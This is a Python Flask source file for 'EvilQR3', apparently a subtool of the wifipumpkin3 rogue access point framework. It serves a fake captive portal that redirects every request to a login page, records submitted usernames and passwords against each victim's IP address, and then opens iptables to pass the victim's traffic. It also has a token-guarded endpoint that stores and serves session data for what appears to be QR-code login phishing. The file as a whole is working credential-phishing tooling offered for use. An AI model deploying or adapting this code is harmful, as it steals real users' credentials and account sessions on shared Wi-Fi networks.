from flask import Flask, request, redirect, render_template, jsonify,make_response, session
from urllib.parse import urlencode, unquote
from wifipumpkin3.core.utility.collection import SettingsINI
import wifipumpkin3.core.utility.constants as C
import sys
import subprocess
import argparse, time, random, string, re

app = Flask(__name__)
app.secret_key = ''.join(random.choice(string.ascii_uppercase) for _ in range(30))
app.config['SESSION_TYPE'] = 'filesystem'
SERVER = None
TOKEN_API = "00000000-0000-0000-0000-000000000000"
PORT = 80
match_useragent = None
config = None
session_data = {}

def matchRequestUserAgent(match_useragent, useragent : str):
    if re.search(match_useragent, useragent):
        return True 
    return False
        

def login_user(ip, iptables_binary_path):
    subprocess.call(
        [iptables_binary_path, "-t", "nat", "-I", "PREROUTING", "1", "-s", ip, "-j", "ACCEPT"]
    )
    subprocess.call([iptables_binary_path, "-I", "FORWARD", "-s", ip, "-j", "ACCEPT"])


@app.route("/login", methods=["GET", "POST"])
def login():
    global SERVER,PORT
    if (
        request.method == "POST"
        and "login" in request.form
        and "password" in request.form
    ):
        sys.stdout.write(
            str(
                {
                    request.remote_addr: {
                        "login": request.form["login"],
                        "password": request.form["password"],
                    }
                }
            )
        )
        global FORCE_REDIRECT, URL_REDIRECT, config
        sys.stdout.flush()
        login_user(request.remote_addr, config.get("iptables", "path_binary"))
        if URL_REDIRECT:
            return redirect(URL_REDIRECT, code=302) 
        if FORCE_REDIRECT:
            return render_template("templates/login_successful.html")
        elif "orig_url" in request.args and len(request.args["orig_url"]) > 0:
            return redirect(unquote(request.args["orig_url"]))
        else:
            return render_template("templates/login_successful.html")
    else:
        return render_template(
            "templates/login.html", 
            server_address=SERVER, 
            server_port=PORT,
            ap_name=config.get("accesspoint", "ssid")
        )

@app.route("/mobile/login", methods=["GET", "POST"])
def Mobilelogin():
    global SERVER, PORT, config
    if (
        request.method == "POST"
        and "login" in request.form
        and "password" in request.form
    ):
        sys.stdout.write(
            str(
                {
                    request.remote_addr: {
                        "login": request.form["login"],
                        "password": request.form["password"],
                    }
                }
            )
        )
        global FORCE_REDIRECT, URL_REDIRECT, config
        sys.stdout.flush()
        login_user(request.remote_addr, config.get("iptables", "path_binary"))
        if URL_REDIRECT:
            return redirect(URL_REDIRECT, code=302) 
        if FORCE_REDIRECT:
            return render_template("templates/login_successful.html")
        elif "orig_url" in request.args and len(request.args["orig_url"]) > 0:
            return redirect(unquote(request.args["orig_url"]))
        else:
            return render_template("templates/login_successful.html")
    else:
        return render_template(
            "templates/mobile.html", 
            server_address=SERVER,
            server_port=PORT,
            ap_name=config.get("accesspoint", "ssid")
        )
        
def response_json(message: str, reponse_code: int = 200):
    response = make_response(
        jsonify(
            message
        ),
        reponse_code,
    )
    response.headers["Content-Type"] = "application/json"
    return response
        
@app.route("/qrcode/<token_id>/", methods=["GET", "PUT"])
def qrcode(token_id: str):
    global TOKEN_API, session_data
    token_bearer = None
    validation_token = False
    updateTime = request.args.get('t', default = 0, type = int)
    if session_data.get('session_info'):
        if updateTime > 0:
            if updateTime >= session_data["session_info"].get("update_time"):
                max_timeout = 20
                if session_data.get('session_info'):
                    while not session_data["session_info"].get("update_qrcode") or max_timeout >= 0:
                        max_timeout -= 5
                        time.sleep(5)
                session_data["session_info"]["update_qrcode"] = False
                return response_json("Request Timeout" , 408)
    try:
        headers = request.headers
        bearer = headers.get('Authorization')
        if bearer:
            token_bearer = bearer.split()[1]  
        if TOKEN_API == token_bearer:
            validation_token = True
    except Exception as e:
        pass
    if (request.method == "PUT"):
        if validation_token:
            content_type = request.headers.get('Content-Type')
            if (content_type == 'application/json'):
                json_body = request.json
                session_data['session_info'] = json_body
                session_data['session_info']['update_time'] = round(time.time())
                session_data["session_info"]["update_qrcode"] = True
                return response_json(session_data['session_info'])
            else:
                return response_json("invalid json input content-type")
        else:
            return response_json("server error: No Autorized ", 401)
    else:
        if session_data.get('session_info'):
            return response_json(session_data['session_info'])
        return response_json("Data Not found", 404) 


@app.route("/favicon.ico")
def favicon():
    return app.send_static_file("templates/favicon.ico")


@app.route("/", defaults={"path": ""})
@app.route("/<path:path>")
def catch_all(path):
    global SERVER, PORT, match_useragent
    if PORT != 80:
        if matchRequestUserAgent(match_useragent, request.headers.get('User-Agent')):
            return redirect(
                "http://{}:{}/mobile/login".format(SERVER, PORT)
            )        
        return redirect(
            "http://{}:{}/login?".format(SERVER, PORT)
        )        
    if matchRequestUserAgent(match_useragent, request.headers.get('User-Agent')):
        return redirect(
                "http://{}/mobile/login".format(SERVER, PORT)
            )  
    return redirect(
        "http://{}/login?".format(SERVER)
    )


# https://stackoverflow.com/questions/15008758/parsing-boolean-values-with-argparse
def str2bool(v):
    if isinstance(v, bool):
        return v
    if v.lower() in ("yes", "true", "t", "y", "1"):
        return True
    elif v.lower() in ("no", "false", "f", "n", "0"):
        return False
    else:
        raise argparse.ArgumentTypeError("Boolean value expected.")


_version = "0.0.1"


def main():
    global SERVER, PORT, TOKEN_API, match_useragent, config
    print("[*] EvilQR3 v{} - subtool from wifipumpkin3".format(_version))
    parser = argparse.ArgumentParser(
        description="EvilQR3 - ")
    parser.add_argument(
        "-t", "--tamplate", required=True, dest="template", help="path the theme login captive portal"
    )
    parser.add_argument(
        "-s", "--static", required=True, dest="static", help="path  of the static files from webpage"
    )

    parser.add_argument(
        "-p",
        "--port",
        dest="port",
        default=80,
        help="The port for captive portal",
    )
    parser.add_argument(
        "-rU",
        "--redirect-url",
        dest="redirect_url",
        default=None,
        help="Url for redirect after user insert the credentials on captive portal",
    )
    parser.add_argument(
        "-sa",
        "--server-address",
        required=True,
        dest="server_address",
        help="IpAddress from gataway captive portal",
    )
    parser.add_argument(
        "-mu",
        "--match-useragent",
        required=True,
        dest="match_useragent",
        help="IpAddress from gataway captive portal",
    )
    parser.add_argument(
        "-tp",
        "--token-api",
        required=True,
        dest="token_api",
        help="The token API for make request with security ",
    )
    parser.add_argument(
        "-d",
        "--debug",
        dest="debug",
        default=False,
        type=str2bool,
        help="Enable debug mode",
    )
    parser.add_argument("-v", "--version", dest="version", help="show version the tool")
    args = parser.parse_args()
    SERVER = args.server_address
    PORT = args.port
    TOKEN_API = args.token_api
    match_useragent = args.match_useragent
    
    config = SettingsINI(C.CONFIG_INI)

    app.static_url_path = "\{}".format(args.static)
    app.static_folder = "{}".format(args.static)
    app.template_folder = args.template

    app.run(SERVER, port=PORT, debug=args.debug)
